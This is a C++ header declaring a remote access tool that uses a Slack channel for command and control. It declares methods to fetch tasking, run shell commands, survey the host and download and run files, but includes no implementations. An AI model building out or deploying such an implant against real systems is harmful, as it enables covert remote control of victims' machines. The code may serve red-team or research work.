#pragma once

#include "slack/web/client.h"
#include "slack/web/slack_response.h"

#include <string>
#include <unordered_map>
#include <tuple>
#include <vector>
#include <chrono>
#include <ctime>
#include <iomanip>


using std::string;
using std::vector;
using std::tuple;
using slack::web::WebClient;
using slack::web::SlackResponse;


class StringDict : public std::unordered_map<string, string>
{
public:
	const string& get(const string& key, const string& def) const {
		if (count(key) == 0)
			return def;
		return at(key);
	}
};

class RemoteAccessCapabilities {
private:
	void _initial_connect();
public:
	
	time_t connect_timestamp{};
	string hostname{};
	string os_version{};
	string os_architecture{};

	RemoteAccessCapabilities();
	
	
	string shell_execute(const string& command_with_args);
	string run_survey();
};

class RemoteAccessTool {
private:
	bool _sent_termination{ false };

	string _gen_random_string(int length);
	string _get_timestamp();
	void _terminate();

	 

public:
	string session_uid{};
	const string oauth_token{};
	const string c2_channel{};
	string c2_channel_id{};
	double last_timestamp{ 0.0 };
	unsigned int sleep_timer{};
	bool heartbeat{ true };
	WebClient client;
	typedef tuple<string, double> LogEntry;
	RemoteAccessCapabilities commands;

	RemoteAccessTool(const StringDict& slack_authentication);
	~RemoteAccessTool();
	string get_channel_id(const string& channel_name);
	vector<LogEntry> get_channel_log() noexcept;
	bool get_tasking();
	bool send_text(const string& text);
	bool send_heartbeat();
	bool send_termination(const string& error_message) noexcept;
	bool download_and_run(const string& filename, const string& outputfile = "", const string& command = "");

	bool is_running();
};
 
